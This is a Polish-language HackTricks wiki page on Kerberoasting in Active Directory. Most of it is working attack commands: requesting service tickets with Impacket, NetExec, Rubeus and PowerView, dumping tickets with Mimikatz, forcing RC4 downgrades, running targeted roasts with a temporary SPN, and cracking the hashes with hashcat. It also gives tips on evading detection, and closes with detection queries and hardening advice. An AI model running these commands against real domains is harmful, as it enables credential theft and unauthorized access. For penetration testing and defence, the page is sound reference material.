# Kerberoast

{{#include ../../banners/hacktricks-training.md}}

## Kerberoast

Kerberoasting koncentruje się na pozyskiwaniu biletów TGS, a konkretnie tych powiązanych z usługami działającymi na kontach użytkowników w Active Directory (AD), z wyłączeniem kont komputerów. Szyfrowanie tych biletów wykorzystuje klucze pochodzące z haseł użytkowników, co umożliwia offline credential cracking. Użycie konta użytkownika jako usługi wskazuje niepusta właściwość ServicePrincipalName (SPN).

Każdy uwierzytelniony użytkownik domeny może zażądać biletów TGS, więc nie są wymagane żadne specjalne uprawnienia.<sup>[[4]](#references)[[5]](#references)</sup>

### Kluczowe punkty

- Cele obejmują bilety TGS dla usług działających na kontach użytkowników (tj. kontach z ustawionym SPN; nie kontach komputerów).
- Bilety są szyfrowane kluczem wyprowadzonym z hasła konta usługi i mogą być łamane offline.
- Nie są wymagane podwyższone uprawnienia; każde uwierzytelnione konto może zażądać biletów TGS.

> [!WARNING]
> Większość publicznych narzędzi preferuje żądanie biletów usługowych RC4-HMAC (etype 23), ponieważ można je łamać szybciej niż AES. Hashes RC4 TGS zaczynają się od `$krb5tgs$23$*`, AES128 od `$krb5tgs$17$*`, a AES256 od `$krb5tgs$18$*`. Jednak wiele środowisk przechodzi na tryb wyłącznie AES. Nie zakładaj, że istotny jest tylko RC4.
> Unikaj również roasting typu „spray-and-pray”. Domyślna funkcja kerberoast w Rubeus może wysyłać zapytania i żądać biletów dla wszystkich SPN, przez co generuje dużo szumu. Najpierw przeprowadź enumerację i wybierz interesujące principals.

### Sekrety kont usługowych i koszt kryptografii Kerberos

Wiele usług nadal działa na kontach użytkowników z ręcznie zarządzanymi hasłami. KDC szyfruje bilety usługowe kluczami wyprowadzonymi z tych haseł i przekazuje ciphertext każdemu uwierzytelnionemu principal, więc kerberoasting zapewnia nieograniczoną liczbę prób offline bez blokad kont i telemetryki DC. Tryb szyfrowania określa budżet cracking:

| Tryb | Wyprowadzanie klucza | Typ szyfrowania | Przybliżona przepustowość RTX 5090* | Uwagi |
| --- | --- | --- | --- | --- |
| AES + PBKDF2 | PBKDF2-HMAC-SHA1 z 4 096 iteracjami i solą per-principal generowaną na podstawie domeny + SPN | etype 17/18 (`$krb5tgs$17$`, `$krb5tgs$18$`) | ~6,8 miliona prób/s | Sól uniemożliwia użycie rainbow tables, ale nadal pozwala na szybkie łamanie krótkich haseł. |
| RC4 + NT hash | Pojedyncze MD4 hasła (niesolone NT hash); Kerberos dodaje jedynie 8-bajtowy confounder dla każdego biletu | etype 23 (`$krb5tgs$23$`) | ~4,18 **miliarda** prób/s | ~1000× szybciej niż AES; atakujący wymuszają RC4, gdy `msDS-SupportedEncryptionTypes` na to pozwala. |

*Benchmarki Chick3nman cytowane w [Matthew Green's Kerberoasting analysis](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/).<sup>[[3]](#references)</sup>

Confounder RC4 randomizuje tylko keystream; nie zwiększa nakładu pracy na każdą próbę. Jeśli konta usługowe nie korzystają z losowych sekretów (gMSA/dMSA, kont komputerów lub ciągów zarządzanych przez vault), szybkość kompromitacji zależy wyłącznie od budżetu GPU. Wymuszenie etype wyłącznie AES usuwa możliwość downgrade'u do miliarda prób na sekundę, ale słabe hasła tworzone przez ludzi nadal mogą zostać złamane za pomocą PBKDF2.<sup>[[3]](#references)</sup>

### Atak

#### Linux

Praktyczny przykład end-to-end wykorzystujący NetExec do żądania biletów podatnych na roasting oraz Hashcat do ich łamania jest dostępny w odniesieniu [1].<sup>[[1]](#references)</sup>
```bash
# Metasploit Framework
msf> use auxiliary/gather/get_user_spns

# Impacket — request and save roastable hashes (prompts for password)
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# With NT hash
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# Target a specific user’s SPNs only (reduce noise)
GetUserSPNs.py -request-user <samAccountName> -dc-ip <DC_IP> <DOMAIN>/<USER>

# NetExec — LDAP enumerate + dump $krb5tgs$23/$17/$18 blobs with metadata
netexec ldap <DC_FQDN> -u <USER> -p <PASS> --kerberoast kerberoast.hashes

# kerberoast by @skelsec (enumerate and roast)
# 1) Enumerate kerberoastable users via LDAP
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -o kerberoastable
# 2) Request TGS for selected SPNs and dump
kerberoast spnroast 'kerberos+password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes
```
Narzędzia wielofunkcyjne obejmujące sprawdzanie kerberoast:
```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN> -ip <DC_IP> -u <USER> -p <PASS> -c
```
#### Windows

- Enumerate użytkowników kerberoastable
```powershell
# Built-in
setspn.exe -Q */*   # Focus on entries where the backing object is a user, not a computer ($)

# PowerView
Get-NetUser -SPN | Select-Object serviceprincipalname

# Rubeus stats (AES/RC4 coverage, pwd-last-set years, etc.)
.\Rubeus.exe kerberoast /stats
```
- Technika 1: Poproś o TGS i wykonaj dump z pamięci
```powershell
# Acquire a single service ticket in memory for a known SPN
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>"  # e.g. MSSQLSvc/mgmt.domain.local

# Get all cached Kerberos tickets
klist

# Export tickets from LSASS (requires admin)
Invoke-Mimikatz -Command '"kerberos::list /export"'

# Convert to cracking formats
python2.7 kirbi2john.py .\some_service.kirbi > tgs.john
# Optional: convert john -> hashcat etype23 if needed
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$*\1*$\2/' tgs.john > tgs.hashcat
```
- Technique 2: Automatyczne narzędzia
```powershell
# PowerView — single SPN to hashcat format
Request-SPNTicket -SPN "<SPN>" -Format Hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
# PowerView — all user SPNs -> CSV
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus — default kerberoast (be careful, can be noisy)
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
# Rubeus — target a single account
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast
# Rubeus — target admins only
.\Rubeus.exe kerberoast /ldapfilter:'(admincount=1)' /nowrap
```
> [!WARNING]
> Żądanie TGS generuje zdarzenie Windows Security 4769 (zażądano biletu usługi Kerberos).

### OPSEC i środowiska wyłącznie AES

- Celowo żądaj RC4 dla kont bez AES:
- Rubeus: `/rc4opsec` używa tgtdeleg do wyliczenia kont bez AES i żąda biletów usług RC4.
- Rubeus: `/tgtdeleg` wraz z kerberoast również wywołuje żądania RC4, gdy jest to możliwe.<sup>[[6]](#references)</sup>
- Roastuj konta wyłącznie AES zamiast kończyć działanie po cichu:
- Rubeus: `/aes` wylicza konta z włączonym AES i żąda biletów usług AES (etype 17/18).
- Jeśli posiadasz już TGT (PTT lub z pliku .kirbi), możesz użyć `/ticket:<blob|path>` wraz z `/spn:<SPN>` lub `/spns:<file>` i pominąć LDAP.
- Targetowanie, ograniczanie częstotliwości i mniejszy szum:
- Użyj `/user:<sam>`, `/spn:<spn>`, `/resultlimit:<N>`, `/delay:<ms>` oraz `/jitter:<1-100>`.
- Filtruj konta z prawdopodobnie słabymi hasłami za pomocą `/pwdsetbefore:<MM-dd-yyyy>` (starsze hasła) lub targetuj uprzywilejowane jednostki OU za pomocą `/ou:<DN>`.<sup>[[8]](#references)</sup>

Przykłady (Rubeus):
```powershell
# Kerberoast only AES-enabled accounts
.\Rubeus.exe kerberoast /aes /outfile:hashes.aes
# Request RC4 for accounts without AES (downgrade via tgtdeleg)
.\Rubeus.exe kerberoast /rc4opsec /outfile:hashes.rc4
# Roast a specific SPN with an existing TGT from a non-domain-joined host
.\Rubeus.exe kerberoast /ticket:C:\\temp\\tgt.kirbi /spn:MSSQLSvc/sql01.domain.local
```
### Cracking
```bash
# John the Ripper
john --format=krb5tgs --wordlist=wordlist.txt hashes.kerberoast

# Hashcat
# RC4-HMAC (etype 23)
hashcat -m 13100 -a 0 hashes.rc4 wordlist.txt
# AES128-CTS-HMAC-SHA1-96 (etype 17)
hashcat -m 19600 -a 0 hashes.aes128 wordlist.txt
# AES256-CTS-HMAC-SHA1-96 (etype 18)
hashcat -m 19700 -a 0 hashes.aes256 wordlist.txt
```
### Persistence / Abuse

Jeśli kontrolujesz konto lub możesz je modyfikować, możesz uczynić je podatnym na kerberoasting, dodając SPN:
```powershell
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='fake/WhateverUn1Que'} -Verbose
```
Obniż wersję konta, aby włączyć RC4 i ułatwić cracking (wymaga uprawnień zapisu do obiektu docelowego):
```powershell
# Allow only RC4 (value 4) — very noisy/risky from a blue-team perspective
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=4}
# Mixed RC4+AES (value 28)
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=28}
```
#### Targeted Kerberoast przez GenericWrite/GenericAll na użytkowniku (tymczasowy SPN)

Gdy BloodHound pokazuje, że masz kontrolę nad obiektem użytkownika (np. GenericWrite/GenericAll), możesz niezawodnie wykonać „targeted-roast” tego konkretnego użytkownika, nawet jeśli obecnie nie ma on żadnych SPN:<sup>[[9]](#references)</sup>

- Dodaj tymczasowy SPN do kontrolowanego użytkownika, aby można było wykonać na nim roast.
- Zażądaj TGS-REP zaszyfrowanego przy użyciu RC4 (etype 23) dla tego SPN, aby ułatwić cracking.
- Złam hash `$krb5tgs$23$...` za pomocą hashcat.
- Usuń SPN, aby zmniejszyć ślady.

Windows (PowerView/Rubeus):
```powershell
# Add temporary SPN on the target user
Set-DomainObject -Identity <targetUser> -Set @{serviceprincipalname='fake/TempSvc-<rand>'} -Verbose

# Request RC4 TGS for that user (single target)
.\Rubeus.exe kerberoast /user:<targetUser> /nowrap /rc4

# Remove SPN afterwards
Set-DomainObject -Identity <targetUser> -Clear serviceprincipalname -Verbose
```
Jednolinijkowiec dla Linuxa (targetedKerberoast.py automatyzuje add SPN -> request TGS (etype 23) -> remove SPN):<sup>[[2]](#references)</sup>
```bash
targetedKerberoast.py -d '<DOMAIN>' -u <WRITER_SAM> -p '<WRITER_PASS>'
```
Złam wynik za pomocą autodetekcji hashcat (tryb 13100 dla `$krb5tgs$23$`):
```bash
hashcat <outfile>.hash /path/to/rockyou.txt
```
Uwagi dotyczące detekcji: dodawanie/usuwanie SPN powoduje zmiany w katalogu (Event ID 5136/4738 na docelowym użytkowniku), a żądanie TGS generuje Event ID 4769. Rozważ ograniczenie częstotliwości oraz prompt cleanup.

Przydatne narzędzia do ataków kerberoast znajdziesz tutaj: https://github.com/nidem/kerberoast

Jeśli w systemie Linux znajdziesz ten błąd: `Kerberos SessionError: KRB_AP_ERR_SKEW (Clock skew too great)`, wynika on z rozbieżności czasu lokalnego. Zsynchronizuj czas z DC:

- `ntpdate <DC_IP>` (przestarzałe w niektórych dystrybucjach)
- `rdate -n <DC_IP>`

### Kerberoast bez konta domenowego (AS-requested STs)

We wrześniu 2022 roku Charlie Clark wykazał, że jeśli principal nie wymaga pre-authentication, możliwe jest uzyskanie service ticket za pomocą spreparowanego KRB_AS_REQ poprzez zmianę sname w treści żądania, co skutecznie pozwala uzyskać service ticket zamiast TGT. Działa to podobnie jak AS-REP roasting i nie wymaga prawidłowych poświadczeń domenowych.

Szczegóły znajdziesz w opracowaniu Semperis „New Attack Paths: AS-requested STs”.<sup>[[10]](#references)</sup>

> [!WARNING]
> Musisz podać listę użytkowników, ponieważ bez prawidłowych poświadczeń nie możesz wykonywać zapytań LDAP za pomocą tej techniki.

Linux

- Impacket (PR #1413):
```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile users.txt -dc-host dc.domain.local domain.local/
```
Windows

- Rubeus (PR #139):
```powershell
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:domain.local /dc:dc.domain.local /nopreauth:NO_PREAUTH_USER /spn:TARGET_SERVICE
```
Powiązane

Jeśli celem są użytkownicy podatni na AS-REP roast, zobacz także:

{{#ref}}
asreproast.md
{{#endref}}

### Wykrywanie

Kerberoasting może być trudny do wykrycia. Monitoruj Event ID 4769 z DC i stosuj filtry, aby ograniczyć szum:

- Wyklucz nazwę usługi `krbtgt` oraz nazwy usług kończące się znakiem `$` (konta komputerów).
- Wyklucz żądania z kont maszyn (`*$$@*`).
- Uwzględniaj tylko pomyślne żądania (Failure Code `0x0`).
- Śledź typy szyfrowania: RC4 (`0x17`), AES128 (`0x11`), AES256 (`0x12`). Nie generuj alertów wyłącznie dla `0x17`.

Przykładowy triage PowerShell:
```powershell
Get-WinEvent -FilterHashtable @{Logname='Security'; ID=4769} -MaxEvents 1000 |
Where-Object {
($_.Message -notmatch 'krbtgt') -and
($_.Message -notmatch '\$$') -and
($_.Message -match 'Failure Code:\s+0x0') -and
($_.Message -match 'Ticket Encryption Type:\s+(0x17|0x12|0x11)') -and
($_.Message -notmatch '\$@')
} |
Select-Object -ExpandProperty Message
```
Dodatkowe pomysły:

- Ustal bazowy poziom normalnego wykorzystania SPN dla każdego hosta/użytkownika; generuj alerty w przypadku dużych serii różnych żądań SPN pochodzących od jednego principal.
- Oznaczaj nietypowe użycie RC4 w domenach zabezpieczonych za pomocą AES.

### Mitigation / Hardening

- Używaj gMSA/dMSA lub kont komputerów dla usług. Konta zarządzane mają losowe hasła o długości ponad 120 znaków i są automatycznie rotowane, co sprawia, że offline cracking jest niepraktyczny.<sup>[[7]](#references)</sup>
- Wymuś AES dla kont usług, ustawiając `msDS-SupportedEncryptionTypes` wyłącznie na AES (dziesiętnie 24 / szesnastkowo 0x18), a następnie rotując hasło, aby zostały wygenerowane klucze AES.<sup>[[7]](#references)</sup>
- Jeśli to możliwe, wyłącz RC4 w swoim środowisku i monitoruj próby użycia RC4. Na DC możesz użyć wartości rejestru `DefaultDomainSupportedEncTypes`, aby sterować ustawieniami domyślnymi dla kont, dla których nie ustawiono `msDS-SupportedEncryptionTypes`. Dokładnie przetestuj tę konfigurację.
- Usuń niepotrzebne SPN z kont użytkowników.<sup>[[7]](#references)</sup>
- Używaj długich, losowych haseł kont usług (co najmniej 25 znaków), jeśli konta zarządzane nie są możliwe; blokuj typowe hasła i regularnie przeprowadzaj audyty.<sup>[[7]](#references)</sup>

## References

- [1] [HTB: Breach – NetExec LDAP kerberoast + łamanie hashy za pomocą hashcat w praktyce](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [2] [ShutdownRepo/targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast)
- [3] [Matthew Green – Kerberoasting: ataki o niskim poziomie technicznym i dużym wpływie oparte na starszej kryptografii Kerberos (2025-09-10)](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/)
- [4] [Kerberos (II): Jak zaatakować Kerberos?](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [5] [ired.team – Nadużywanie Active Directory Kerberos: T1208 Kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
- [6] [ired.team – Kerberoasting: żądanie zaszyfrowanych za pomocą RC4 TGS, gdy AES jest włączony](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)
- [7] [Microsoft Security Blog (2024-10-11) – Wskazówki firmy Microsoft pomagające ograniczyć Kerberoasting](https://www.microsoft.com/en-us/security/blog/2024/10/11/microsofts-guidance-to-help-mitigate-kerberoasting/)
- [8] [SpecterOps – dokumentacja polecenia kerberoast w Rubeus](https://docs.specterops.io/ghostpack-docs/Rubeus-mdx/commands/roasting/kerberoast)
- [9] [HTB: Delegate — dane uwierzytelniające SYSVOL → Targeted Kerberoast → Unconstrained Delegation → DCSync do DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)
- [10] [Semperis – Nowe ścieżki ataku? Żądane bilety usług AS (Charlie Clark, wrzesień 2022)](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/)
{{#include ../../banners/hacktricks-training.md}}
